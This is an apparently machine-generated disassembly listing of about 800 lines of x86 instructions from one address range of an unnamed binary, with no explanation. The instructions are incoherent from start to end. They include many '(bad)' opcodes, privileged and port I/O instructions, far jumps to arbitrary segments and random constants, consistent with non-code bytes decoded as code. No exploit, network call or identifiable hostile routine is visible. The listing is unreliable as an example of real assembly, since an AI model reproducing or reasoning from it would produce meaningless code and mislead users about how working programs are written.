  40719a:	imul   eax,DWORD PTR [bp+si+0x341b],0xf20127e0
  4071a3:	xor    ch,ah
  4071a5:	movhps QWORD PTR [edi-0x54289a2a],xmm2
  4071ac:	icebp  
  4071ad:	cld    
  4071ae:	ds in  al,0xd1
  4071b1:	daa    
  4071b2:	(bad)  
  4071b3:	xchg   esi,eax
  4071b4:	xlat   BYTE PTR ds:[ebx]
  4071b5:	aaa    
  4071b6:	jno    0x4071c8
  4071b8:	call   0xba7:0x7096afd5
  4071bf:	adc    eax,0xb344ffa9
  4071c4:	xor    al,0x89
  4071c6:	dec    ebx
  4071c7:	stc    
  4071c8:	(bad)  
  4071c9:	xor    ebx,edx
  4071cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071cc:	popf   
  4071cd:	out    dx,eax
  4071ce:	push   ecx
  4071cf:	mov    bh,0x61
  4071d1:	mov    ebx,esi
  4071d3:	inc    esi
  4071d4:	sbb    eax,0xa44aecf
  4071d9:	push   eax
  4071da:	cwde   
  4071db:	stos   BYTE PTR es:[edi],al
  4071dc:	repnz or ecx,DWORD PTR [esi+0x5640532d]
  4071e3:	fisub  WORD PTR [ecx-0x6d]
  4071e6:	xchg   esp,eax
  4071e7:	cmp    ah,BYTE PTR [edx+eiz*8-0x7b]
  4071eb:	daa    
  4071ec:	cmp    ch,dl
  4071ee:	iret   
  4071ef:	xor    BYTE PTR [eax-0x57b7997e],dh
  4071f5:	push   edi
  4071f6:	mov    esi,0x74ccf17b
  4071fb:	mov    ebx,DWORD PTR [ebx+0x4df8628]
  407201:	add    BYTE PTR [esp+eiz*4+0x832978f],ah
  407208:	xor    DWORD PTR [eax-0x777d6d87],ecx
  40720e:	and    esi,edi
  407210:	aad    0x9
  407212:	xchg   DWORD PTR [esi],esp
  407214:	add    eax,0xffffffe9
  407217:	xchg   WORD PTR [edx-0x593ff0bc],ax
  40721e:	dec    ebp
  40721f:	cld    
  407220:	mov    edx,eax
  407222:	pushf  
  407223:	or     BYTE PTR [ebx*2+0x650c2220],dl
  40722a:	xor    DWORD PTR [ecx-0x4086f480],edx
  407230:	mov    ebp,0x245a59ad
  407235:	cmp    al,0x6a
  407237:	dec    ebp
  407238:	inc    edi
  407239:	pop    eax
  40723a:	mov    bh,0x8b
  40723c:	dec    ebp
  40723d:	pop    edx
  40723e:	xchg   BYTE PTR [eax+0x416baec1],bl
  407244:	data16 outs dx,BYTE PTR ds:[esi]
  407246:	lock into 
  407248:	retf   0x5bf5
  40724b:	imul   edi,edi,0xd3c2de6d
  407251:	xor    esp,DWORD PTR [eax+edx*8]
  407254:	sbb    ebp,DWORD PTR [eax-0x5389c041]
  40725a:	in     eax,0xc0
  40725c:	mov    edx,0x94a273ef
  407261:	jnp    0x407211
  407263:	mov    dl,0x4a
  407265:	pop    edx
  407266:	and    dl,BYTE PTR [esi-0x319fd3a0]
  40726c:	add    al,0xe7
  40726e:	pushf  
  40726f:	sub    al,0x2f
  407271:	test   al,0xf0
  407273:	ret    
  407274:	mov    edx,0xc1d2a4d2
  407279:	push   0x2727cc30
  40727e:	sahf   
  40727f:	out    0xad,al
  407281:	mov    ds:0x9f0246e9,al
  407286:	and    BYTE PTR [ebx-0x1baad5a6],bh
  40728c:	xchg   DWORD PTR [edi+0x5ea8996e],ebp
  407292:	sbb    eax,0x756d6040
  407297:	in     eax,dx
  407298:	mov    eax,ds:0x79c241dc
  40729d:	dec    ecx
  40729e:	cld    
  40729f:	iret   
  4072a0:	cwde   
  4072a1:	gs push esi
  4072a3:	jmp    0x3198:0x64defe9b
  4072aa:	(bad)  
  4072ac:	loope  0x407286
  4072ae:	lods   eax,DWORD PTR ds:[esi]
  4072af:	xor    edx,edi
  4072b1:	inc    ebp
  4072b2:	rep lods al,BYTE PTR ds:[esi]
  4072b4:	mov    ebp,0xfa9b8ce
  4072b9:	mov    eax,0x9c0236ac
  4072be:	adc    al,0x7e
  4072c1:	cmc    
  4072c2:	stos   DWORD PTR es:[edi],eax
  4072c3:	(bad)  
  4072c4:	xor    al,ah
  4072c6:	and    BYTE PTR [esi-0x72],dh
  4072c9:	or     DWORD PTR [eax],eax
  4072cb:	ja     0x407274
  4072cd:	repz int 0x19
  4072d0:	lods   eax,DWORD PTR ds:[esi]
  4072d1:	mov    eax,0x712a4b2d
  4072d6:	call   0x1ebf2b6a
  4072db:	rcr    DWORD PTR [ebx-0x75],0x3
  4072df:	mov    ch,BYTE PTR [eax]
  4072e1:	cwde   
  4072e2:	ret    0x87f5
  4072e5:	inc    eax
  4072e6:	fild   WORD PTR [esi]
  4072e8:	jecxz  0x4072d4
  4072ea:	xchg   BYTE PTR [eax-0x319a34b4],al
  4072f0:	test   ch,dh
  4072f2:	ins    BYTE PTR es:[edi],dx
  4072f3:	nop
  4072f4:	shr    ah,0x5e
  4072f7:	gs xor ecx,ebx
  4072fa:	cwde   
  4072fb:	gs retf 0x887d
  4072ff:	mov    DWORD PTR [eax],ebx
  407301:	test   al,0x31
  407303:	ins    DWORD PTR es:[edi],dx
  407304:	jno    0x407364
  407306:	lods   al,BYTE PTR ds:[esi]
  407307:	adc    DWORD PTR [ebx-0x5f],eax
  40730a:	jb     0x40730d
  40730c:	dec    esp
  40730d:	or     edx,0x34
  407310:	pop    ss
  407311:	icebp  
  407312:	not    DWORD PTR [ebx+0x24e535ca]
  407318:	sbb    BYTE PTR [ebp-0x6c9e3225],al
  40731e:	js     0x40738a
  407320:	sbb    edi,esi
  407322:	mov    esi,DWORD PTR [ebp-0x1c]
  407325:	stos   DWORD PTR es:[edi],eax
  407326:	sub    eax,0x529dc88d
  40732b:	push   ebx
  40732c:	imul   edi,DWORD PTR [eax+ebx*8],0xd607ffdf
  407333:	div    ecx
  407335:	push   cs
  407336:	fist   DWORD PTR [ebp+0x34]
  407339:	data16 in al,dx
  40733b:	dec    esp
  40733c:	sbb    eax,0xafe822af
  407341:	sbb    DWORD PTR [esi+esi*8-0x29],ecx
  407345:	xchg   DWORD PTR ds:0x3fc39182,ebx
  40734b:	enter  0x86df,0x2b
  40734f:	stc    
  407350:	inc    ebp
  407351:	xor    edi,ebx
  407353:	shr    DWORD PTR [edi+0x342a0700],1
  407359:	or     eax,0xbe0996ca
  40735e:	adc    eax,0x3e33a2f4
  407363:	push   edx
  407364:	sti    
  407365:	idiv   BYTE PTR [edi-0x62]
  407368:	and    ch,BYTE PTR [ebx-0x78774808]
  40736e:	dec    ebp
  40736f:	popa   
  407370:	je     0x407345
  407372:	xchg   esp,eax
  407373:	cmp    eax,0x531a0135
  407378:	inc    edx
  407379:	fcom   DWORD PTR [edx]
  40737b:	fdiv   DWORD PTR [ebx+0x199b3942]
  407381:	ja     0x40736e
  407383:	mov    cl,BYTE PTR [esi+ecx*1+0x7da6283]
  40738a:	sub    al,0x4f
  40738c:	jmp    0xcfc6:0x7e831a16
  407393:	adc    cl,ah
  407395:	sub    DWORD PTR [edi],esi
  407397:	inc    eax
  407398:	xor    DWORD PTR [esp+ebx*4-0x6d],eax
  40739c:	inc    edx
  40739d:	dec    ebp
  40739e:	aaa    
  40739f:	addr16 push ss
  4073a1:	je     0x4073d9
  4073a3:	sti    
  4073a4:	icebp  
  4073a5:	inc    edx
  4073a6:	imul   BYTE PTR [ebp+0x6d4e557b]
  4073ac:	mov    ah,0x78
  4073ae:	sub    al,0x58
  4073b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073b1:	call   FWORD PTR [ebp-0x28]
  4073b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073b5:	adc    al,0x5d
  4073b7:	add    ah,BYTE PTR [ebp-0x75]
  4073ba:	sbb    eax,0x9447ac56
  4073bf:	xlat   BYTE PTR fs:[ebx]
  4073c1:	jle    0x407364
  4073c3:	stos   DWORD PTR es:[edi],eax
  4073c4:	ficomp WORD PTR [ebx+0x63]
  4073c7:	cld    
  4073c8:	sar    BYTE PTR [esi+0x7708f031],cl
  4073ce:	jo     0x4073f6
  4073d0:	mov    ebp,0x392445cf
  4073d5:	fadd   DWORD PTR [ecx+0x57]
  4073d8:	pop    ecx
  4073d9:	jg     0x4073e6
  4073db:	mov    dl,0xdf
  4073dd:	cli    
  4073de:	sahf   
  4073df:	push   esi
  4073e0:	in     al,0x51
  4073e2:	jle    0x407367
  4073e4:	ja     0x407387
  4073e6:	xor    ch,BYTE PTR [esi+0x60e5c8b1]
  4073ec:	xor    al,0xa8
  4073ee:	mov    cl,0xb6
  4073f0:	xchg   ecx,eax
  4073f1:	mov    WORD PTR [esi],fs
  4073f3:	ret    0x3bb7
  4073f6:	xchg   edi,eax
  4073f7:	cli    
  4073f8:	inc    edx
  4073f9:	mov    ?,WORD PTR [esi+0x169c8674]
  4073ff:	mov    edx,ds
  407401:	(bad)  
  407402:	sbb    al,0xcb
  407404:	xlat   BYTE PTR ds:[ebx]
  407405:	jl     0x40744d
  407407:	in     al,0x24
  407409:	cmc    
  40740a:	cmp    eax,0x9e721934
  40740f:	daa    
  407410:	aad    0xef
  407412:	dec    edi
  407413:	lahf   
  407414:	dec    esi
  407415:	pop    ebx
  407416:	ret    0xbfd0
  407419:	dec    esi
  40741a:	hlt    
  40741b:	aam    0x5b
  40741d:	jge    0x40740d
  40741f:	mov    al,ds:0xc93653ec
  407424:	sub    ebx,ecx
  407426:	xchg   edi,eax
  407427:	cmc    
  407428:	push   0x79
  40742a:	xchg   edi,eax
  40742b:	mov    ds:0x3ef6d417,al
  407430:	inc    esp
  407431:	push   0xefb3c038
  407436:	mov    eax,ds:0x73a7f1f7
  40743b:	jecxz  0x40744c
  40743d:	fldenv [eax+0x7c]
  407440:	push   edi
  407441:	mov    bl,0xba
  407443:	ret    0x596c
  407446:	inc    edx
  407447:	jo     0x40748d
  407449:	mov    ebp,0xe20c0c03
  40744e:	xchg   esp,eax
  40744f:	push   ebx
  407450:	fwait
  407451:	rcr    BYTE PTR [edi+0x1de4c546],1
  407457:	cmp    BYTE PTR [esi-0x1f],dl
  40745a:	xchg   ecx,eax
  40745b:	jae    0x407426
  40745d:	push   es
  40745e:	inc    ebx
  40745f:	inc    eax
  407460:	mov    al,ds:0xc8010b3d
  407465:	das    
  407466:	push   edi
  407467:	jecxz  0x407429
  407469:	or     DWORD PTR [esp+ecx*2+0x6073d759],esp
  407470:	cwde   
  407471:	push   edi
  407472:	cmp    ebx,DWORD PTR [eax+0x1e]
  407475:	ins    BYTE PTR es:[edi],dx
  407476:	add    DWORD PTR [edx+0x3f],edi
  407479:	push   edi
  40747a:	mov    al,ds:0xe88df31f
  40747f:	stos   DWORD PTR es:[edi],eax
  407480:	fnstsw WORD PTR [eax-0x2fdf8cfb]
  407486:	sbb    al,0x6d
  407488:	sub    al,0xa
  40748a:	xchg   edi,eax
  40748b:	inc    esi
  40748c:	or     ecx,DWORD PTR [ecx+0x73]
  40748f:	outs   dx,BYTE PTR ds:[esi]
  407490:	sub    dh,BYTE PTR [eax+0x7550d64c]
  407496:	ffree  st(6)
  407498:	mov    cl,0x12
  40749a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40749b:	cld    
  40749c:	fcomp  QWORD PTR [edx+0x78]
  40749f:	rcr    DWORD PTR [ebx+0x74],cl
  4074a2:	cmp    al,0xa7
  4074a4:	scas   al,BYTE PTR es:[edi]
  4074a5:	ja     0x407434
  4074a7:	xchg   DWORD PTR [edx],esp
  4074a9:	js     0x4074a5
  4074ab:	mov    BYTE PTR [edx-0x634da371],cl
  4074b1:	dec    ecx
  4074b2:	jg     0x4074af
  4074b4:	xchg   esp,eax
  4074b5:	cmp    DWORD PTR [ebp+0x46],esi
  4074b8:	lds    edi,FWORD PTR [eax+0x20570eca]
  4074be:	cld    
  4074bf:	(bad)  
  4074c0:	and    cl,ah
  4074c2:	mov    ah,0x59
  4074c4:	mov    ch,0xe2
  4074c6:	jo     0x4074c5
  4074c8:	sub    ebp,DWORD PTR fs:[edx-0x3f1b1552]
  4074cf:	icebp  
  4074d0:	add    al,dh
  4074d2:	and    BYTE PTR [edi],ch
  4074d4:	fimul  WORD PTR [ecx+0x89a0cb]
  4074da:	inc    esp
  4074db:	xchg   esp,eax
  4074dc:	fwait
  4074dd:	and    BYTE PTR [edi+0x7c4a3b54],bl
  4074e3:	inc    ebx
  4074e4:	repz into 
  4074e6:	shr    DWORD PTR ds:0x5c434867,0xcc
  4074ed:	fild   QWORD PTR [edx]
  4074ef:	rcr    dh,cl
  4074f1:	leave  
  4074f2:	push   cs
  4074f3:	(bad)  [eax]
  4074f5:	daa    
  4074f6:	mov    dh,0x47
  4074f8:	pop    eax
  4074f9:	loop   0x407487
  4074fb:	test   DWORD PTR [edi-0x3b996e29],ecx
  407501:	test   al,0x64
  407503:	jne    0x407557
  407505:	jo     0x407527
  407507:	cdq    
  407508:	pop    ebp
  407509:	scas   eax,DWORD PTR es:[edi]
  40750a:	adc    dh,cl
  40750c:	pop    esp
  40750d:	mov    edi,ebp
  40750f:	push   ebp
  407510:	jmp    0x22e2:0x7d52627a
  407517:	sub    eax,DWORD PTR [ebx]
  407519:	ins    BYTE PTR es:[edi],dx
  40751a:	or     eax,0xe425901d
  40751f:	cmp    bl,bl
  407521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407522:	and    esi,DWORD PTR [ebx+0x4e62667]
  407528:	jns    0x4074e3
  40752a:	mov    ds:0x119f3cd3,eax
  40752f:	into   
  407530:	jp     0x407512
  407532:	out    dx,al
  407533:	xchg   BYTE PTR [edi+eax*8],al
  407536:	inc    ebp
  407537:	sub    esp,DWORD PTR [edi]
  407539:	fs repnz es cld 
  40753d:	shl    bh,cl
  40753f:	dec    edx
  407540:	bound  edi,QWORD PTR [ebp+0x46]
  407543:	inc    edi
  407544:	mov    ebp,0x7c9478d5
  407549:	xor    DWORD PTR [eax],0x10
  40754c:	sahf   
  40754d:	sahf   
  40754e:	jl     0x4075a5
  407550:	push   esi
  407551:	scas   al,BYTE PTR es:[edi]
  407552:	popa   
  407553:	ja     0x407557
  407555:	jbe    0x407532
  407557:	mov    esp,0x6151d82a
  40755c:	jne    0x4074fe
  40755e:	ffree  st(6)
  407560:	outs   dx,DWORD PTR ds:[esi]
  407561:	repz jmp 0x407539
  407564:	cmp    cl,bh
  407566:	imul   ebp,ebp,0xc5df7a3d
  40756c:	sub    al,BYTE PTR [ebp-0x66fabc31]
  407572:	add    BYTE PTR [esi-0x28],ah
  407575:	sub    ch,BYTE PTR [eax-0x15b904c]
  40757b:	aam    0xbd
  40757d:	jnp    0x4075d6
  40757f:	mov    bl,0x3b
  407581:	adc    ch,ch
  407583:	es clc 
  407585:	retf   
  407586:	sahf   
  407587:	xor    dl,bl
  407589:	out    0x5c,eax
  40758b:	ds push ds
  40758d:	into   
  40758e:	in     al,0x69
  407590:	call   0xd5e5:0x32332a09
  407597:	xor    al,0xb4
  407599:	xor    ah,ah
  40759b:	sar    DWORD PTR [esi],0x3d
  40759e:	aam    0x46
  4075a0:	pushf  
  4075a1:	retf   
  4075a2:	push   esp
  4075a3:	pop    ecx
  4075a4:	sti    
  4075a5:	push   cs
  4075a6:	adc    ebp,DWORD PTR [eax]
  4075a8:	push   eax
  4075a9:	pop    ds
  4075aa:	test   eax,0x7a060998
  4075af:	mov    edx,0xbc959bb4
  4075b4:	jl     0x4075f4
  4075b6:	cli    
  4075b7:	push   ds
  4075b8:	cmp    edx,edi
  4075ba:	leave  
  4075bb:	syscall 
  4075bd:	ins    BYTE PTR es:[edi],dx
  4075be:	adc    dh,al
  4075c0:	mov    dh,0x5e
  4075c2:	jg     0x4075f1
  4075c4:	mov    dl,0x44
  4075c6:	test   al,bl
  4075c8:	dec    esi
  4075c9:	call   0x35f5:0x8decd473
  4075d0:	xor    ch,BYTE PTR [ebp+0x61]
  4075d3:	jecxz  0x407620
  4075d5:	imul   ebx,DWORD PTR [esi],0xffffffb7
  4075d8:	fcomp  DWORD PTR [ebx]
  4075da:	inc    ebp
  4075db:	pop    ds
  4075dc:	inc    edx
  4075dd:	les    ebp,FWORD PTR [ebx+0x7e0349cd]
  4075e3:	daa    
  4075e4:	or     BYTE PTR [edi+eiz*1-0x12],bl
  4075e8:	ds push ecx
  4075ea:	ret    
  4075eb:	sbb    DWORD PTR [edi-0xc300885],0x873d9abe
  4075f5:	ss mov ebx,0xa7af3bee
  4075fb:	sar    DWORD PTR [ecx-0x5a16793b],1
  407601:	ds sub ch,bh
  407604:	test   esi,ebx
  407606:	push   0xffffffa5
  407608:	ins    DWORD PTR es:[edi],dx
  407609:	jne    0x4075b6
  40760b:	iret   
  40760c:	jae    0x407671
  40760e:	dec    edx
  40760f:	jmp    0xcb8d:0x203bc25b
  407616:	push   ss
  407617:	gs push ebx
  407619:	divps  xmm3,xmm1
  40761c:	xchg   edi,eax
  40761d:	mov    eax,ds:0xb00c6da6
  407622:	push   eax
  407623:	sub    BYTE PTR [eax],al
  407625:	push   edi
  407626:	call   0x51a1:0xd6c666c6
  40762d:	push   eax
  40762e:	push   esp
  40762f:	lods   eax,DWORD PTR ds:[esi]
  407630:	fist   WORD PTR [eax]
  407632:	jns    0x4075bf
  407634:	adc    al,0xbb
  407636:	push   ebp
  407637:	sbb    eax,0x6d03eb6d
  40763c:	mov    esi,0xe4ef7a43
  407641:	sahf   
  407642:	ja     0x407643
  407644:	stc    
  407645:	sub    al,0x8d
  407647:	mov    bl,0x15
  407649:	stos   BYTE PTR es:[edi],al
  40764a:	jb     0x4075dc
  40764c:	inc    edi
  40764d:	adc    ecx,0xffffff92
  407650:	dec    eax
  407651:	pop    edx
  407652:	in     eax,0x40
  407654:	sbb    BYTE PTR [edi+0x4ac63e6a],cl
  40765a:	xor    eax,DWORD PTR [ebx+0xa]
  40765d:	imul   edx,DWORD PTR [ebx-0x53dad1e],0xfffffffd
  407664:	or     ah,bh
  407666:	mov    dh,0x9c
  407668:	js     0x407607
  40766a:	or     eax,0x5cf30aa9
  40766f:	jno    0x4075f9
  407671:	std    
  407672:	lods   eax,DWORD PTR ds:[esi]
  407673:	(bad)  
  407674:	jmp    0x4076b1
  407676:	fmul   DWORD PTR [edx+0x70]
  407679:	test   al,0x7f
  40767b:	inc    ebx
  40767c:	in     eax,0x48
  40767e:	ins    DWORD PTR es:[edi],dx
  40767f:	loope  0x40763a
  407681:	rcl    cl,0x15
  407684:	jnp    0x4076bd
  407686:	test   al,0x97
  407688:	retf   0xc508
  40768b:	xor    dl,BYTE PTR [eax]
  40768d:	(bad)  
  40768e:	(bad)  
  40768f:	outs   dx,DWORD PTR ds:[esi]
  407690:	dec    ecx
  407691:	js     0x4076bc
  407693:	in     eax,dx
  407694:	mov    BYTE PTR [ecx-0x7fa0a427],ch
  40769a:	arpl   dx,di
  40769c:	jne    0x4076c7
  40769e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40769f:	(bad)  
  4076a0:	mov    ds:0xb94d4a8,eax
  4076a5:	mov    dh,0xe3
  4076a7:	jbe    0x407697
  4076a9:	jecxz  0x40768a
  4076ab:	xor    BYTE PTR ds:0xea352c2b,0xe6
  4076b2:	sbb    DWORD PTR [ebx+0x30],ebp
  4076b5:	(bad)  
  4076b6:	dec    edi
  4076b7:	pop    ecx
  4076b8:	(bad)  
  4076b9:	push   eax
  4076ba:	sar    BYTE PTR [esi],1
  4076bc:	aas    
  4076bd:	xchg   edi,eax
  4076be:	f2xm1  
  4076c0:	pop    edx
  4076c1:	cdq    
  4076c2:	or     ebp,esp
  4076c4:	leave  
  4076c5:	jno    0x4076c8
  4076c7:	stos   BYTE PTR es:[edi],al
  4076c8:	xor    eax,0x4d7450a
  4076cd:	jg     0x4076d1
  4076cf:	ins    BYTE PTR es:[edi],dx
  4076d0:	enter  0x8282,0x9b
  4076d4:	out    0x96,eax
  4076d6:	faddp  st(3),st
  4076d8:	mov    ?,WORD PTR [esi]
  4076da:	repz jnp 0x407741
  4076dd:	mov    eax,0x63701366
  4076e2:	loop   0x4076e6
  4076e4:	int3   
  4076e5:	test   DWORD PTR [edx],0x77aa51ca
  4076eb:	mov    bl,0x0
  4076ed:	inc    esp
  4076ee:	cmp    ecx,DWORD PTR [ebp-0x7b]
  4076f1:	xchg   ecx,ebx
  4076f3:	jp     0x4076b9
  4076f5:	pop    edx
  4076f6:	mov    WORD PTR [eax+ecx*4-0x69b9aec7],ds
  4076fd:	cli    
  4076fe:	cmp    eax,0xed94b18
  407703:	cdq    
  407704:	std    
  407705:	jne    0x40776f
  407707:	or     ch,0x96
  40770a:	jmp    0x407740
  40770c:	xor    eax,0x7e24fb98
  407711:	aaa    
  407712:	retf   
  407713:	out    0x6f,eax
  407715:	int    0x5e
  407717:	mov    cl,0xe8
  407719:	rcl    BYTE PTR [ebp-0x58],0xb4
  40771d:	inc    edi
  40771e:	mov    ebp,0x8d74bb37
  407723:	sbb    ebp,ebx
  407725:	pop    edx
  407726:	xchg   ebp,eax
  407727:	jne    0x407799
  407729:	bound  esi,QWORD PTR [edx+0x7b]
  40772c:	pop    esp
  40772d:	push   ss
  40772e:	mov    eax,ds:0x815f9604
  407733:	push   ss
  407734:	jp     0x407778
  407736:	std    
  407737:	mov    eax,ds:0x553cfb21
  40773c:	dec    eax
  40773d:	int    0x0
  40773f:	cmc    
  407740:	sbb    eax,DWORD PTR [ebx]
  407742:	xchg   esp,eax
  407743:	aad    0xa1
  407745:	hlt    
  407746:	push   eax
  407747:	fcom   st(2)
  407749:	inc    eax
  40774a:	out    0x7a,al
  40774c:	ds aam 0xf8
  40774f:	jmp    0x1f88:0x984f42fa
  407756:	pop    esp
  407757:	popa   
  407758:	pop    edx
  407759:	leave  
  40775a:	jno    0x40778b
  40775c:	adc    al,0x5e
  40775e:	jl     0x40778e
  407760:	test   al,0x94
  407762:	pop    edx
  407763:	add    al,0x78
  407766:	xchg   DWORD PTR [edx-0x2fb289c1],edi
  40776c:	adc    ch,ch
  40776e:	fmul   QWORD PTR [ebx+0x4df8ea46]
  407774:	push   esi
  407775:	fcmovnb st,st(4)
  407777:	ror    BYTE PTR [edi-0x64],1
  40777a:	std    
  40777b:	test   DWORD PTR [edi-0x3d925c15],esp
  407781:	cs pushf 
  407783:	fistp  QWORD PTR [ebx]
  407785:	out    0x47,al
  407787:	(bad)  
  407788:	ins    DWORD PTR es:[edi],dx
  407789:	aad    0xfd
  40778b:	call   0x5e1e079b
  407790:	xchg   ebp,eax
  407791:	ins    DWORD PTR es:[edi],dx
  407792:	ret    0x21f4
  407795:	xchg   BYTE PTR [eax-0x5a],dl
  407798:	pop    ebp
  407799:	(bad)  
  40779a:	inc    ebp
  40779b:	push   ebp
  40779c:	js     0x4077ca
  40779e:	add    DWORD PTR [ecx-0x3966f083],ebx
  4077a4:	cmp    DWORD PTR [ecx],esp
  4077a6:	jle    0x4077eb
  4077a8:	push   eax
  4077a9:	shl    DWORD PTR [edi+0x79],0xdd
  4077ad:	mov    ebp,0x82603a1e
  4077b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077b3:	data16 mov ds:0x6e828c19,al
  4077b9:	pop    ecx
  4077ba:	jmp    0xc5daa62f
  4077bf:	jmp    0x1a9f:0x714ff413
  4077c6:	jle    0x40775a
  4077c8:	fs ds in al,0xd
  4077cc:	push   ebp
  4077cd:	cmp    al,0x1c
  4077cf:	ss ins BYTE PTR es:[edi],dx
  4077d1:	fucomi st,st(4)
  4077d3:	push   esi
  4077d4:	ins    DWORD PTR es:[edi],dx
  4077d5:	sub    BYTE PTR [esi+0x12],al
  4077d8:	mov    al,0x55
  4077da:	sbb    BYTE PTR [ecx],ch
  4077dc:	add    al,BYTE PTR [eax+0x44]
  4077df:	rcl    DWORD PTR [ebx-0x4e24741c],0xa8
  4077e6:	out    dx,eax
  4077e7:	int3   
  4077e8:	imul   edi,DWORD PTR [ebx-0x3d],0xb82c0e92
  4077ef:	cs push edi
  4077f1:	call   0x656c9f31
  4077f6:	jbe    0x4077f8
  4077f8:	enter  0x948f,0xee
  4077fc:	call   DWORD PTR [esp+ebp*8]
  4077ff:	rol    ecx,0x7c
  407802:	test   cl,0x86
  407805:	inc    eax
  407806:	mov    eax,ds:0x5d63b86b
  40780b:	push   ebx
  40780c:	pop    ss
  40780d:	(bad)  
  40780e:	and    ecx,eax
  407810:	call   0x4b57b38e
  407815:	add    edx,edi
  407817:	nop
  407818:	scas   eax,DWORD PTR es:[edi]
  407819:	aad    0xa3
  40781b:	or     BYTE PTR [edx],ch
  40781d:	and    eax,0xcb4448a7
  407822:	xchg   DWORD PTR [ecx-0x5226bf47],edx
  407828:	jbe    0x407868
  40782a:	and    DWORD PTR [edx],esp
  40782c:	cmp    ebp,ebx
  40782e:	bound  edi,QWORD PTR [edi]
  407830:	fistp  DWORD PTR [esi-0x7f]
  407833:	bound  esi,QWORD PTR [edx+ebp*8-0x31]
  407837:	sub    al,0xc3
  407839:	push   esp
  40783a:	jge    0x4077ce
  40783c:	mov    edx,ebp
  40783e:	jne    0x40786a
  407840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407841:	pop    esi
  407842:	lds    esp,FWORD PTR [ebp-0x7d]
  407845:	inc    edx
  407846:	retf   0x5416
  407849:	out    dx,al
  40784a:	mov    al,ds:0xf82c6cfa
  40784f:	fcmovne st,st(2)
  407851:	mov    edx,ebx
  407853:	mov    edi,edx
  407855:	je     0x4077e2
  407857:	repnz push fs
  40785a:	push   esi
  40785b:	xchg   ebx,eax
  40785c:	lods   eax,DWORD PTR ds:[esi]
  40785d:	loop   0x407895
  40785f:	jg     0x4078d0
  407861:	adc    dh,ch
  407863:	int    0x53
  407865:	rcr    ah,1
  407867:	daa    
  407868:	push   esi
  407869:	enter  0x3dcc,0x11
  40786d:	inc    ebx
  40786e:	rcr    DWORD PTR [edx+0x7374ee91],1
  407874:	inc    ebp
  407875:	or     edx,DWORD PTR [eax]
  407877:	ins    BYTE PTR es:[edi],dx
  407878:	pushf  
  407879:	push   ss
  40787a:	pop    ebx
  40787b:	fcomp  QWORD PTR [edx-0x790e3e64]
  407881:	add    bl,dh
  407883:	out    0x52,eax
  407885:	mov    edx,0xaed5351
  40788a:	popf   
  40788b:	arpl   WORD PTR [ebp+ebp*1-0x46e175ed],sp
  407892:	mov    ds:0x352635ba,al
  407897:	and    al,0xeb
  407899:	cmp    DWORD PTR [ecx+0xf3a2036],ebx
  40789f:	jmp    DWORD PTR [ecx]
  4078a1:	ror    DWORD PTR [edx-0x5d],cl
  4078a4:	inc    ebx
  4078a5:	out    dx,eax
  4078a6:	cmp    esp,DWORD PTR [ebx]
  4078a8:	mov    al,ds:0x7d7b0d1e
  4078ad:	mov    eax,DWORD PTR [edx+esi*8-0x64994732]
  4078b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078b5:	sbb    DWORD PTR [edi],esi
  4078b7:	ss inc ebx
  4078b9:	in     al,dx
  4078ba:	inc    ebx
  4078bb:	cmp    edx,DWORD PTR [eax-0xb]
  4078be:	jo     0x40792e
  4078c0:	jmp    0x9f83921
  4078c5:	push   esp
  4078c6:	nop
  4078c7:	mov    eax,ds:0x471707bf
  4078cc:	lea    edx,[edx+edx*8-0x70460435]
  4078d3:	lods   eax,DWORD PTR ds:[esi]
  4078d4:	sbb    al,0xb5
  4078d6:	sti    
  4078d7:	push   0xfffffffe
  4078d9:	cwde   
  4078da:	arpl   WORD PTR [esi-0x65248b4c],sp
  4078e0:	mov    eax,0xcc90242d
  4078e5:	mov    edi,0xfa252fba
  4078ea:	sbb    eax,0x26f5376b
  4078ef:	addr16 jg 0x407927
  4078f2:	popf   
  4078f3:	iret   
  4078f4:	and    ebp,DWORD PTR [ecx]
  4078f6:	shl    BYTE PTR [ebp-0x24522536],cl
  4078fc:	inc    edx
  4078fd:	data16 aas 
  4078ff:	fst    DWORD PTR [eax+0x7d]
  407902:	or     BYTE PTR [edx+0x5f1d2ee0],bl
  407908:	pop    esp
  407909:	lahf   
  40790a:	(bad)  
  40790c:	fimul  WORD PTR [ebx+0x2c]
  40790f:	pop    eax
  407910:	leave  
  407911:	jns    0x40791c
  407913:	in     al,dx
  407914:	sub    BYTE PTR [ebp+eax*8-0x28df5056],0xe7
  40791c:	sbb    edi,esi
  40791e:	bound  ecx,QWORD PTR [ebp+0x2d]
  407921:	add    DWORD PTR [ecx-0x766e3791],ecx
  407927:	mov    ds,WORD PTR [ecx-0x63]
  40792a:	mov    BYTE PTR [eax+ebp*1+0x21],ah
  40792e:	or     eax,0x93d9cb43
  407933:	das    
  407934:	dec    ecx
  407935:	push   cs
  407936:	lds    esp,FWORD PTR [ebx-0x5d08ba07]
  40793c:	daa    
  40793d:	ins    DWORD PTR es:[edi],dx
  40793e:	push   es
  40793f:	loop   0x407958
  407941:	xchg   BYTE PTR [ebp+0x7c],dl
  407944:	fisub  DWORD PTR [edi-0x55]
  407947:	and    BYTE PTR [edx+0x48],0xc7
  40794b:	adc    DWORD PTR [esi+0xf7262f5],esi
  407951:	dec    eax
  407952:	std    
  407953:	ins    BYTE PTR es:[edi],dx
  407954:	jnp    0x4079bc
  407956:	dec    eax
  407957:	imul   ecx,DWORD PTR [ebx],0xfffffff8
  40795a:	push   ss
  40795b:	or     al,0x2d
  40795d:	pmuludq mm7,QWORD PTR [ebx]
  407960:	push   ds
  407961:	lock and bh,0xf5
  407965:	aaa    
  407966:	cmc    
  407967:	inc    ecx
  407968:	pop    ds
  407969:	mov    DWORD PTR [edi],0xf4f90bb8
  40796f:	ins    BYTE PTR es:[edi],dx
  407970:	push   0x85370d14
  407975:	shl    dh,1
  407977:	xchg   DWORD PTR [ecx+eax*1],edi
  40797a:	pop    eax
  40797b:	mov    bh,0x6
  40797d:	add    dl,ah
